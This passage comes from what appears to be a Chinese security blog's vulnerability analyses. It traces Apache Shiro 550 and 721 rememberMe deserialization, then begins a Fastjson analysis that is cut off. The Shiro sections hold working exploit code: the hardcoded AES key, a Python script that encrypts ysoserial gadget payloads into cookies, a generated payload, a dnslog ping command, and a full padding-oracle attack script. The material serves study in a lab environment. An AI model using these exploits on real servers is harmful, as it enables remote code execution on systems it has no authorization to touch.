Base64.decode(&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;);</code></pre><p>下一步跟踪到这</p><pre><code class="java">protected byte[] getRememberedSerializedIdentity(SubjectContext subjectContext) &#123;    if (!WebUtils.isHttp(subjectContext)) &#123;        if (log.isDebugEnabled()) &#123;            String msg = &quot;SubjectContext argument is not an HTTP-aware instance.  This is required to obtain a &quot; +                    &quot;servlet request and response in order to retrieve the rememberMe cookie. Returning &quot; +                    &quot;immediately and ignoring rememberMe operation.&quot;;            log.debug(msg);        &#125;        return null;    &#125;    WebSubjectContext wsc = (WebSubjectContext) subjectContext;    if (isIdentityRemoved(wsc)) &#123;        return null;    &#125;    HttpServletRequest request = WebUtils.getHttpRequest(wsc);    HttpServletResponse response = WebUtils.getHttpResponse(wsc);    String base64 = getCookie().readValue(request, response);    // Browsers do not always remove cookies immediately (SHIRO-183)    // ignore cookies that are scheduled for removal    if (Cookie.DELETED_COOKIE_VALUE.equals(base64)) return null;    if (base64 != null) &#123;        base64 = ensurePadding(base64);        if (log.isTraceEnabled()) &#123;            log.trace(&quot;Acquired Base64 encoded identity [&quot; + base64 + &quot;]&quot;);        &#125;        byte[] decoded = Base64.decode(base64);        if (log.isTraceEnabled()) &#123;            log.trace(&quot;Base64 decoded byte array length: &quot; + (decoded != null ? decoded.length : 0) + &quot; bytes.&quot;);        &#125;        return decoded;    &#125; else &#123;        //no cookie set - new site visitor?        return null;    &#125;&#125;</code></pre><p>这里的逻辑是先获取cookie中rememberMe的值，然后判断是否是deleteMe，不是则判断是否是符合base64的编码长度，然后再对其进行base64解码，将解码结果返回。</p><p>整个解密过程就结束了，虽然是往前跟踪，但是还是可以清楚的知道解密过程都是围绕Cookie中的<code>rememberMe</code>进行的，如果我们能构造<code>rememberMe</code>,就能执行命令了</p><p>查看依赖</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304161707095.png" alt="image-20230411222937180"></p><p>如果要执行命令，这里有两条链可以用，<code>CommonsCollections11</code>和<code>CommonsBeanutils1_183</code></p><p>使用<a href="https://github.com/KpLi0rn/ysoserial%E8%BF%99%E4%B8%AA%E5%B7%A5%E5%85%B7%E5%8D%B3%E5%8F%AF%E8%8E%B7%E5%BE%97poc%EF%BC%8C%E8%AF%A5%E5%B7%A5%E5%85%B7%E6%AF%94%E5%8E%9F%E7%89%88%E7%9A%84ysoserial%E5%A4%9A%E4%BA%86CommonsBeanutils1_183%E8%BF%99%E6%9D%A1%E9%93%BE">https://github.com/KpLi0rn/ysoserial这个工具即可获得poc，该工具比原版的ysoserial多了CommonsBeanutils1_183这条链</a></p><p>到这还不行，还要对poc进行加密，按照刚刚分析的，先对poc进行AES加密，然后再进行Base64加密</p><p>python exp</p><pre><code class="python">import sysimport base64import uuidfrom random import Randomimport subprocessfrom Crypto.Cipher import AESdef encode_rememberme(command):    popen = subprocess.Popen([&#39;D:\\Java\\jdk1.8.0_111\\bin\\java.exe&#39;, &#39;-jar&#39;, &#39;ysoserial-0.0.6-SNAPSHOT-all.jar&#39;, &#39;CommonsCollections11&#39;, command], stdout=subprocess.PIPE)    BS   = AES.block_size    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()    key  =  &quot;kPH+bIxk5D2deZiIxcaaaA==&quot;    mode =  AES.MODE_CBC    iv   =  uuid.uuid4().bytes    encryptor = AES.new(base64.b64decode(key), mode, iv)    file_body = pad(popen.stdout.read())    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))    return base64_ciphertextif __name__ == &#39;__main__&#39;:    payload = encode_rememberme(sys.argv[1])    print(&quot;rememberMe=&#123;&#125;&quot;.format(payload.decode()))</code></pre><p>运行</p><pre><code>python exp.py &quot;calc&quot;</code></pre><p>运行结果</p><pre><code>rememberMe=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</code></pre><p>将它添加到Cookie上，注意，要删除原来的<code>JSESSIONID=xxxx</code> ,如果存在，系统将不解析rememberMe进行身份认证，导致无法利用</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304161707940.png" alt="image-20230411223955129"></p><p>运行结果</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304161706555.png" alt="image-20230411224237689"></p><h1 id="Shiro721"><a href="#Shiro721" class="headerlink" title="Shiro721"></a>Shiro721</h1><h2 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h2><p>在Shiro721漏洞中，由于Apache Shiro cookie中通过 AES-128-CBC 模式加密的rememberMe字段存在问题，用户可通过Padding Oracle Attack来构造恶意的rememberMe字段，并重新请求网站，进行反序列化攻击，最终导致任意代码执行。</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304161706845.png" alt="img"></p><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p>知道已经登陆用户的合法cookie且目标服务器含有可利用的攻击链就可以进行漏洞利用。</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><pre><code>1.2.5,  1.2.6,  1.3.0,  1.3.1,  1.3.2,  1.4.0-RC2,  1.4.0,  1.4.1</code></pre><h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><p>在Shiro550中,加密Cookie的密钥是硬编码的</p><pre><code class="java">public AbstractRememberMeManager() &#123;        this.serializer = new DefaultSerializer&lt;PrincipalCollection&gt;();        this.cipherService = new AesCipherService();        setCipherKey(DEFAULT_CIPHER_KEY_BYTES);    &#125;</code></pre><p>在1.2.5的版本后密钥变成了动态的,通过<code>generateNewKey()</code>获取密钥</p><pre><code class="java">public AbstractRememberMeManager() &#123;        this.serializer = new DefaultSerializer&lt;PrincipalCollection&gt;();        AesCipherService cipherService = new AesCipherService();        this.cipherService = cipherService;        setCipherKey(cipherService.generateNewKey().getEncoded());    &#125;</code></pre><p>跟进查看<code>generateNewKey</code></p><pre><code class="java">public Key generateNewKey(int keyBitSize) &#123;    KeyGenerator kg;    try &#123;        kg = KeyGenerator.getInstance(getAlgorithmName());    &#125; catch (NoSuchAlgorithmException e) &#123;        String msg = &quot;Unable to acquire &quot; + getAlgorithmName() + &quot; algorithm.  This is required to function.&quot;;        throw new IllegalStateException(msg, e);    &#125;    kg.init(keyBitSize);    return kg.generateKey();&#125;</code></pre><p>这里使用了<code>init()</code>对keyBitSize进行初始化,跟进查看</p><pre><code class="java">public final void init(int keysize) &#123;    this.init(keysize, JCAUtil.getDefSecureRandom());&#125;</code></pre><p>这里调用了双参数<code>init()</code>，并且获取了一个随机数发生器<code>SecureRandom</code></p><p>下一步调用了<code>kg.generateKey()</code></p><pre><code class="java">public final SecretKey generateKey() &#123;    if (this.serviceIterator == null) &#123;        return this.spi.engineGenerateKey();    &#125; else &#123;        RuntimeException failure = null;        KeyGeneratorSpi mySpi = this.spi;        while(true) &#123;            try &#123;                return mySpi.engineGenerateKey();            &#125; catch (RuntimeException var4) &#123;                if (failure == null) &#123;                    failure = var4;                &#125;                mySpi = this.nextSpi(mySpi, true);                if (mySpi == null) &#123;                    throw failure;                &#125;            &#125;        &#125;    &#125;&#125;</code></pre><p>于生成加密所需的密钥，该方法首先会检查是否存在可用的 Service Provider Interface (SPI) 实例，如果存在则调用该实例的 engineGenerateKey() 方法来生成密钥</p><p>跟到<code>engineGenerateKey()</code></p><pre><code class="java">protected SecretKey engineGenerateKey()&#123;    SecretKeySpec var1 = null;    if(this.random == null)&#123;        this.random = SunJCE.getRandom();    &#125;    byte[] var2 = new byte[this.keySize];    this.random.nextBytes(var2);    var1 = new SecretKeySpec(var2,&quot;AES&quot;);    return var1;&#125;</code></pre><p>这里使用了AES算法生成对称密钥</p><p>以上是生成密钥的过程</p><h2 id="Padding-Oracle-Attack"><a href="#Padding-Oracle-Attack" class="headerlink" title="Padding Oracle Attack"></a>Padding Oracle Attack</h2><p><strong>PS:懵了</strong></p><p>参考<a href="https://goodapple.top/archives/217">https://goodapple.top/archives/217</a></p><p>Padding Oracle Attack加密数据整体过程：</p><ol><li>选择一个明文<code>P</code>，用来生成你想要的密文<code>C</code>；</li><li>使用适当的Padding将字符串填充为块大小的倍数，然后将其拆分为从1到N的块；</li><li>生成一个随机数据块（C[n]表示最后一个密文块）；</li><li>对于每一个明文块，从最后一块开始：<ol><li>创建一个包括两块的密文C’，其是通过一个空块（00000…）与最近生成的密文块C[n+1]（如果是第一轮则是随机块）组合成的；</li><li>这步容易理解，就是Padding Oracle的基本攻击原理：修改空块的最后一个字节直至Padding Oracle没有出现错误为止，然后继续将最后一个字节设置为2并修改最后第二个字节直至Padding Oracle没有出现错误为止，依次类推，继续计算出倒数第3、4…个直至最后一个数据为止；</li><li>在计算完整个块之后，将它与明文块P[n]进行XOR一起创建C[n]；</li><li>对后续的每个块重复上述过程（在新的密文块前添加一个空块，然后进行Padding Oracle爆破计算）；</li></ol></li></ol><p>简单地说，每一个密文块解密为一个未知值，然后与前一个密文块进行XOR。通过仔细选择前一个块，我们可以控制下一个块解密来得到什么。即使下一个块解密为一堆无用数据，但仍然能被XOR化为我们控制的值，因此可以设置为任何我们想要的值</p><p>Padding Oracle Attack攻击是一种类似于sql盲注的攻击,这就要求服务器端有能够被我们利用的布尔条件</p><p>在<a href="https://goodapple.top/archives/217">https://goodapple.top/archives/217</a> 这篇文章中，模拟的环境如下：</p><ul><li>当收到一个有效的密文（一个被正确填充并包含有效数据的密文）时，应用程序正常响应（200 OK）</li><li>当收到无效的密文时（解密时填充错误的密文），应用程序会抛出加密异常（500 内部服务器错误）</li><li>当收到一个有效密文（解密时正确填充的密文）但解密为无效值时，应用程序会显示自定义错误消息 (200 OK)</li></ul><p>说明可以通过响应头来判断明文填充是否正确，进而爆破出中间值</p><h2 id="布尔条件"><a href="#布尔条件" class="headerlink" title="布尔条件"></a>布尔条件</h2><p>回到Shiro中，解密函数<code>AbstractRememberMeManager.decrypt()</code>:</p><pre><code class="java">protected byte[] decrypt(byte[] encrypted) &#123;    byte[] serialized = encrypted;    CipherService cipherService = getCipherService();    if (cipherService != null) &#123;        ByteSource byteSource = cipherService.decrypt(encrypted, getDecryptionCipherKey());        serialized = byteSource.getBytes();    &#125;    return serialized;&#125;</code></pre><p>跟进<code>cipherService.decrypt()</code>，最后到<code>crypt()</code>中调用<code>doFinal()</code>方法</p><pre><code class="java">private byte[] crypt(javax.crypto.Cipher cipher, byte[] bytes) throws CryptoException &#123;    try &#123;        return cipher.doFinal(bytes);    &#125; catch (Exception e) &#123;        String msg = &quot;Unable to execute &#39;doFinal&#39; with cipher instance [&quot; + cipher + &quot;].&quot;;        throw new CryptoException(msg, e);    &#125;&#125;</code></pre><p>这里的<code>doFinal()</code>方法对密文进行异常处理</p><pre><code class="java">public final byte[] doFinal(byte[] input) throws IllegalBlockSizeException, BadPaddingException &#123;    this.checkCipherState();    if (input == null) &#123;        throw new IllegalArgumentException(&quot;Null input buffer&quot;);    &#125; else &#123;        this.chooseFirstProvider();        return this.spi.engineDoFinal(input, 0, input.length);    &#125;&#125;</code></pre><p><code>doFinal()</code>方法有<code>IllegalBlockSizeException</code>和<code>BadPaddingException</code>这两个异常，分别用于捕获块大小异常和填充错误异常。异常会被抛出到<code>crypt()</code>方法中，最终被<code>getRememberedPrincipals()</code>方法捕获，并执行<code>onRememberedPrincipalFailure()</code>方法。</p><pre><code class="java">public PrincipalCollection getRememberedPrincipals(SubjectContext subjectContext) &#123;    PrincipalCollection principals = null;    try &#123;        byte[] bytes = getRememberedSerializedIdentity(subjectContext);        //SHIRO-138 - only call convertBytesToPrincipals if bytes exist:        if (bytes != null &amp;&amp; bytes.length &gt; 0) &#123;            principals = convertBytesToPrincipals(bytes, subjectContext);        &#125;    &#125; catch (RuntimeException re) &#123;        principals = onRememberedPrincipalFailure(re, subjectContext);    &#125;    return principals;&#125;</code></pre><p>这里的onRememberedPrincipalFailure()<code>方法调用了</code>forgetIdentity()该方法会调用<code>removeFrom()</code>，在response头部添加字段<code>Set-Cookie: rememberMe=deleteMe</code>。</p><pre><code class="java">protected PrincipalCollection onRememberedPrincipalFailure(RuntimeException e, SubjectContext context) &#123;    if (log.isWarnEnabled()) &#123;        String message = &quot;There was a failure while trying to retrieve remembered principals.  This could be due to a &quot; +                &quot;configuration problem or corrupted principals.  This could also be due to a recently &quot; +                &quot;changed encryption key, if you are using a shiro.ini file, this property would be &quot; +                &quot;&#39;securityManager.rememberMeManager.cipherKey&#39; see: http://shiro.apache.org/web.html#Web-RememberMeServices. &quot; +                &quot;The remembered identity will be forgotten and not used for this request.&quot;;        log.warn(message);    &#125;    forgetIdentity(context);    //propagate - security manager implementation will handle and warn appropriately    throw e;&#125;</code></pre><p>倘若Padding结果不正确的话，响应包就会返回 <code>Set-Cookie: rememberMe=deleteMe</code></p><p>如果Padding结果正确呢？</p><p>CBC模式下的分组密码，如果某一组的密文被破坏，那么在其之后的分组都会受到影响。这时候我们的密文就无法正确的被反序列化了</p><p>在反序列化的过程中，如果反序列化的结果错误，则会抛出异常。最后异常仍会被<code>getRememberedPrincipals()</code>方法处理。</p><p>但是对于Java来说，反序列化是以Stream的方式按顺序进行的，向其后添加或更改一些字符串并不会影响正常反序列化。</p><pre><code class="java">public T deserialize(byte[] serialized) throws SerializationException &#123;    if (serialized == null) &#123;        String msg = &quot;argument cannot be null.&quot;;        throw new IllegalArgumentException(msg);    &#125;    ByteArrayInputStream bais = new ByteArrayInputStream(serialized);    BufferedInputStream bis = new BufferedInputStream(bais);    try &#123;        ObjectInputStream ois = new ClassResolvingObjectInputStream(bis);        @SuppressWarnings(&#123;&quot;unchecked&quot;&#125;)        T deserialized = (T) ois.readObject();        ois.close();        return deserialized;    &#125; catch (Exception e) &#123;        String msg = &quot;Unable to deserialize argument byte array.&quot;;        throw new SerializationException(msg, e);    &#125;&#125;</code></pre><p>综上所述</p><ul><li>Padding正确，服务器正常响应</li><li>Padding错误，服务器返回<code>Set-Cookie: rememberMe=deleteMe</code></li></ul><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>这里使用的是Vulfocus的环境</p><p>首先先登陆</p><p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20230416170055907.png" alt="image-20230416170055907"></p><p>获取COOkie</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304161706960.png" alt="image-20230416170218529"></p><p>先用<code>ysoserial</code>生成class</p><pre><code class="bash">java -jar ysoserial.jar CommonsCollections1 &quot;ping 4997u3.dnslog.cn&quot; &gt; payload.class</code></pre><p>python exp：</p><pre><code class="python">#https://github.com/3ndz/Shiro-721# -*- coding: utf-8 -*-from paddingoracle import BadPaddingException, PaddingOraclefrom base64 import b64encode, b64decodefrom urllib import quote, unquoteimport requestsimport socketimport timeclass PadBuster(PaddingOracle):    def __init__(self, **kwargs):        super(PadBuster, self).__init__(**kwargs)        self.session = requests.Session()        self.wait = kwargs.get(&#39;wait&#39;, 2.0)    def oracle(self, data, **kwargs):        somecookie = b64encode(b64decode(unquote(sys.argv[2])) + data)        self.session.cookies[&#39;rememberMe&#39;] = somecookie        if self.session.cookies.get(&#39;JSESSIONID&#39;):            del self.session.cookies[&#39;JSESSIONID&#39;]        while 1:            try:                response = self.session.get(sys.argv[1],                        stream=False, timeout=5, verify=False)                break            except (socket.error, requests.exceptions.RequestException):                logging.exception(&#39;Retrying request in %.2f seconds...&#39;,                                  self.wait)                time.sleep(self.wait)                continue        self.history.append(response)        if response.headers.get(&#39;Set-Cookie&#39;) is None or &#39;deleteMe&#39; not in response.headers.get(&#39;Set-Cookie&#39;):            logging.debug(&#39;No padding exception raised on %r&#39;, somecookie)            return        raise BadPaddingExceptionif __name__ == &#39;__main__&#39;:    import logging    import sys    if not sys.argv[3:]:        print &#39;Usage: %s &lt;url&gt; &lt;somecookie value&gt; &lt;payload&gt;&#39; % (sys.argv[0], )        sys.exit(1)    logging.basicConfig(level=logging.DEBUG)    encrypted_cookie = b64decode(unquote(sys.argv[2]))    padbuster = PadBuster()    payload = open(sys.argv[3], &#39;rb&#39;).read()    enc = padbuster.encrypt(plaintext=payload, block_size=16)    print(&#39;rememberMe cookies:&#39;)    print(b64encode(enc))</code></pre><p>使用方法:</p><pre><code class="bash">python shiro_exp.py http://192.168.110.131:41906/account [rememberMeCookie] payload.class</code></pre><p>也可以使用工具：</p><p><a href="https://github.com/feihong-cs/ShiroExploit-Deprecated">https://github.com/feihong-cs/ShiroExploit-Deprecated</a></p><p>PS：跑很久</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304161706812.png" alt="image-20230416170521336"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Fastjson漏洞分析</title>
      <link href="/2023/04/08/Fastjson%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
      <url>/2023/04/08/Fastjson%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="Fastjson漏洞分析"><a href="#Fastjson漏洞分析" class="headerlink" title="Fastjson漏洞分析"></a>Fastjson漏洞分析</h1><p><code>FastJson</code> 是阿⾥巴巴的开源 <code>JSON 解析库</code>，它可以解析 JSON 格式的字符串，⽀持将<code> Java Bean</code> 序列</p><p>化为 <code>JSON</code> 字符串，也可以从JSON字符串反序列化到 Java Bean</p><p>环境：</p><p>jdk1.8.0_u111</p><p>fastjson: 1.2.24</p><pre><code class="xml">&lt;dependency&gt;  &lt;groupId&gt;com.alibaba&lt;/groupId&gt;  &lt;artifactId&gt;fastjson&lt;/artifactId&gt;  &lt;version&gt;1.2.24&lt;/version&gt;&lt;/dependency&gt;</code></pre><h2 id="Fastjson的简单使用"><a href="#Fastjson的简单使用" class="headerlink" title="Fastjson的简单使用"></a>Fastjson的简单使用</h2><pre><code class="java">package org.example;import com.alibaba.fastjson.JSON;import com.alibaba.fastjson.JSONObject;import jdk.nashorn.api.scripting.JSObject;public class demo1 &#123;    public static void main(String[] args) &#123;        String s = &quot;&#123;\&quot;age\&quot;:\&quot;18\&quot;,\&quot;name\&quot;:\&quot;abc\&quot;&#125;&quot;;        JSONObject jsonObject = JSON.parseObject(s);//将字符串解析为json格式        System.out.println(jsonObject);    &#125;&#125;</code></pre><p>输出结果：</p><pre><code class="tex">&#123;&quot;name&quot;:&quot;abc&quot;,&quot;age&quot;:&quot;18&quot;&#125;</code></pre><h2 id="Java-Bean"><a href="#Java-Bean" class="headerlink" title="Java Bean"></a>Java Bean</h2><p>Java Bean 是一种符合特定规范的 Java 类，它是指那些用于传递数据的简单对象。Java Bean 类通常具有以下特点：</p><ol><li>必须有一个默认的构造函数；</li><li>属性必须私有化<code>public</code>，通过公有的<code>public</code>   getter&#x2F;setter 方法进行访问；</li></ol><pre><code class="java">public class Person &#123;    private String name;    private int age;    public String getName() &#123; return this.name; &#125;    public void setName(String name) &#123; this.name = name; &#125;    public int getAge() &#123; return this.age; &#125;    public void setAge(int age) &#123; this.age = age; &#125;&#125;</code></pre><p>Java Bean 主要用于封装数据，方便在不同层间传递。它们通常被广泛用于图形用户界面 (GUI) 编程、企业级应用程序和数据库操作等方面，可以使代码更加清晰易懂，并且提高代码的可复用性和扩展性。</p><h2 id="Fastjson-Java-Bean"><a href="#Fastjson-Java-Bean" class="headerlink" title="Fastjson+Java Bean"></a>Fastjson+Java Bean</h2><p>先写一个<code>Java Bean</code>  Person类</p><pre><code class="java">package org.example;public class Person &#123;    private String name;    private int age;    public void Person() &#123;        System.out.println(&quot;调用空参构造Person()&quot;);    &#125;    public void Person(String name, int age) &#123;        System.out.println(&quot;调用形参构造Person(String name, int age)&quot;);        this.name = name;        this.age = age;    &#125;    public String getName() &#123;        System.out.println(&quot;调用getName()&quot;);        return name;    &#125;    public void setName(String name) &#123;        System.out.println(&quot;调用setName()&quot;);        this.name = name;    &#125;    public int getAge() &#123;        System.out.println(&quot;调用getAge()&quot;);        return age;    &#125;    public void setAge(int age) &#123;        System.out.println(&quot;调用setAge()&quot;);        this.age = age;    &#125;    @Override    public String toString() &#123;        System.out.println(&quot;调用toString()&quot;);        return &quot;User&#123;&quot; +                &quot;name=&#39;&quot; + name + &#39;\&#39;&#39; +                &quot;, age=&quot; + age +                &#39;&#125;&#39;;    &#125;&#125;</code></pre><p>写个demo</p><pre><code class="java">package org.example;import com.alibaba.fastjson.JSON;import com.alibaba.fastjson.JSONObject;import jdk.nashorn.api.scripting.JSObject;public class demo1 &#123;    public static void main(String[] args) &#123;        String s = &quot;&#123;\&quot;age\&quot;:\&quot;18\&quot;,\&quot;name\&quot;:\&quot;abc\&quot;&#125;&quot;;        Person p =  JSON.parseObject(s,Person.class);//解析的时候指定解析的类,指定了对象类型        System.out.println(p);        System.out.println(p.getName());        System.out.println(p.getAge());        System.out.println(p.toString());    &#125;&#125;</code></pre><p>输出结果</p><pre><code class="tex">调用setAge()调用setName()调用toString()User&#123;name=&#39;abc&#39;, age=18&#125;调用getName()abc调用getAge()18调用toString()User&#123;name=&#39;abc&#39;, age=18&#125;</code></pre><p>这里可以看到，把json字符串解析为java对象，并且能够正常调用对象的方法</p><p>通过输出结果和调试了解到，json中对应的值是通过setter方法传给对象的 ，并且通过getter获取值</p><h2 id="奇怪的特性"><a href="#奇怪的特性" class="headerlink" title="奇怪的特性"></a>奇怪的特性</h2><p>上面的都是比较正常的用法,但是Fastjson有个奇怪的特性，就是它会根据传入的字符串不同，导致解析不同的类</p><p>例如：</p><pre><code class="java">package org.example;import com.alibaba.fastjson.JSON;import com.alibaba.fastjson.JSONObject;import jdk.nashorn.api.scripting.JSObject;public class demo1 &#123;    public static void main(String[] args) &#123;        String s = &quot;&#123;\&quot;@type\&quot;:\&quot;org.example.Person\&quot;,\&quot;age\&quot;:\&quot;18\&quot;,\&quot;name\&quot;:\&quot;abc\&quot;&#125;&quot;;        JSONObject jsonObject = JSON.parseObject(s);        System.out.println(jsonObject);        System.out.println(jsonObject.get(&quot;age&quot;));    